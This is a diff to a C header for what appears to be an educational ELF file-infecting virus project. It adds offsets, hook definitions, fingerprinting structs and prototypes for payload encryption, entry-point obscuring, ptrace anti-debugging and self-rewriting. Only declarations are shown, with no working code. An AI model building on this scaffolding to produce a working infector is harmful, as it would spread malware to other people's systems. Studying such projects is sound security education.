@@ -11,28 +11,46 @@
 # include <sys/stat.h>
 # include <fcntl.h>
 # include <limits.h>
+# include <signal.h>
 
-// # define KEY 0x12345678
+# define KEY 0x62F98A47
 # define SUB 0x95837523
 # define MAGIC_VIRUS 0x4E505241
-# define SIGN_SIZE 0x28
+# define SIGN_SIZE 0x25
 
-# define FT_MEMCPY_ADDR 0x1300
+# define FT_MEMCPY_ADDR 0x15b0
 # define BUF_SIZE 0x20
-# define END_SIZE 0xe5
-# define LOADER_SIZE 0xe5
-# define PAYLOAD_SIZE 0x2ce0 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x2c1e - FT_MEMCPY_ADDR
-# define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
+# define BIS_SIZE 0x3ad
+# define LOADER_SIZE 0xca
+# define PAYLOAD_SIZE 0x56a5 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x519a - FT_MEMCPY_ADDR
+# define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8
 
-# define OFFSET_1 0x20c3 - FT_MEMCPY_ADDR
-# define OFFSET_2 0x21ea - FT_MEMCPY_ADDR
-# define OFFSET_3 0x23fe - FT_MEMCPY_ADDR
-# define OFFSET_4 0x2c29 - FT_MEMCPY_ADDR
+# define OFFSET_1 0x4137 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_2 0x403f + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_3 0x4179 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_4 0x51a5 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_5 0x17ec + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_6 0x4e45 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_7 0x43af + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_8 0x51fb + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_RIP 0x4e54 - FT_MEMCPY_ADDR
+
+# define OFFSET_HOOK_1 0x4e6f + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_1 0x4e65 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_2 0x4e9c + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_2 0x4e92 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_3 0x4ec9 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_3 0x4ebf + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_4 0x4ef6 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_4 0x4eec + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_5 0x4f23 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_5 0x4f19 + BIS_SIZE - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
 	void		*file;
+	int		fd;
 	size_t		file_size;
 	void		*text_begin;
 	size_t		text_size;
@@ -43,11 +61,21 @@ typedef struct		s_info
 
 	size_t		bss_size;
 	size_t		begin_bss;
-	size_t		offset_payload;
-	size_t		addr_payload;
+	size_t		offset_bis;
+	size_t		addr_bis;
 
-	int32_t		 valid_target;
+	int32_t		valid_target;
+	int32_t		in_pestilence;
+
+// 	size_t		tab_addr[12];
+	size_t		*tab_addr;
 }					t_info;
+
+typedef struct		s_fingerprint
+{
+	uint32_t	fingerprint;
+	uint32_t	index;
+}					t_fingerprint;
 
 struct linux_dirent64 {
 	ino64_t        d_ino;    /* 64-bit inode number */
@@ -58,43 +86,84 @@ struct linux_dirent64 {
 };
 
 void		loader();
-int			main();
+int		main();
 void		ft_end();
-void		woody();
+void		syscalls();
 
-/*			**** FILL_BUFF ****					*/
+/*			**** FILL_BUFF ****				*/
 void		write_begin(char *buf);
 void		write_filename_src(char *buf);
 void		write_test(char *buf);
 void		write_test2(char *buf);
 void		write_sign(char *buf);
 void		write_proc(char *buf);
+void		write_exe(char *buf);
 void		write_inhibitor(char *buf);
 void		write_stat(char *buf);
 
-/*			**** PARSING ****					*/
-int			find_text(t_info *info);
-void		epo_parsing(t_info *info);
-int			pe_parsing(t_info *info);
-void		patch_end(t_info *info, int32_t nb);
-int			check_process(char *buf_path);
+/*			**** CHECK OWN FILE ****			*/
+void		update_own_index(t_fingerprint *fingerprint, t_info *info);
+void		rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st);
+void		get_path_own_file(char *buf, t_info *info);
 
-/*			**** LIB HANDLERS	****			*/
+
+/*			**** UTILS ****					*/
+void		itoa(char *buf, int32_t nb);
 void		ft_memcpy(void *dest, void *src, size_t size);
 void		ft_memcpy_r(void *dest, void *src, size_t size);
 void		ft_memset(void *ptr, size_t size, unsigned char val);
 char		*ft_strcat(char *dest, const char *src);
-int			ft_sysopen(const char *pathname, int flags);
-int			ft_sysclose(int fd);
+int		ft_strncmp(const char *s1, const char *s2, int n);
+int		ft_strlen(const char *s);
+void		*get_rip();
+void		double_ret();
+uint32_t	get_key_func(int nb);
+
+/*			**** CRYPTO ****				*/
+void		patch_key(t_info *info, uint32_t key);
+uint32_t	hash_loader(t_info *info);
+uint32_t        hash_func(void *addr, size_t size, uint32_t hash);
+uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
+void		crypt_payload(t_info *info, uint32_t fingerprint);
+uint32_t        encrypt_func(void *addr, size_t size, uint32_t key);
+uint32_t        decrypt_func(t_info *info, void *addr, size_t size, uint32_t nb);
+void            reencrypt_func(t_info *info, void *addr, size_t size, uint32_t key);
+
+/*			**** PATCH ****					*/
+void		patch_addresses(t_info *info);
+void		patch_bis(t_info *info, int32_t nb);
+void		patch_payload(t_info *info);
+void		patch_loader(t_info *info, uint32_t hash);
+
+/*			**** PARSING ****				*/
+int             update_index(t_fingerprint *fingerprint, t_info *info);
+int             check_magic(t_info *info, t_fingerprint *fingerprint);
+size_t          get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp);
+int             valid_call(t_info *info, int pos);
+void            patch_sections_header(t_info *info, size_t offset, size_t to_add);
+int		find_text(t_info *info, t_fingerprint *fingerprint);
+void            hook_call(t_info *info, int32_t nb);
+void            patch_close_entries(t_info *info, int32_t nb);
+void		epo_parsing(t_info *info);
+int		pe_parsing(t_info *info);
+int             parse_process(char *path, int pid_len, char *buf_inhibitor);
+void		patch_bis(t_info *info, int32_t nb);
+int		check_process(char *buf_path, t_info *info);
+void		mprotect_text(int prot);
+
+/*			**** LIB SYSCALL ****				*/
+int		ft_sysopen(const char *pathname, int flags);
+int		ft_sysopenmode(const char *pathname, int flags, int mode);
+int		ft_sysclose(int fd);
 ssize_t 	ft_syswrite(int fd, const void *buf, size_t count);
 void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
-int			ft_sysptrace(long request, long pid, unsigned long addr, unsigned long data);
+int		ft_sysptrace(long request, long pid, unsigned long addr, unsigned long data);
 void		*ft_sysmunmap(void *addr, size_t len);
-int			ft_sysfstat(int fd, struct stat *buf); 
-int			ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
+int		ft_sysfstat(int fd, struct stat *buf); 
+int		ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
+pid_t		ft_sysgetpid();
+void		ft_sysreadlink(char *sym_path, char *real_path, size_t size);
+int		ft_sysunlink(char *path);
 ssize_t		ft_sysread(int fd, void *buf, size_t count);
-int			ft_strncmp(const char *s1, const char *s2, int n);
-int			ft_strlen(const char *s);
-void		handle_exit(void *addr);
 
 #endif
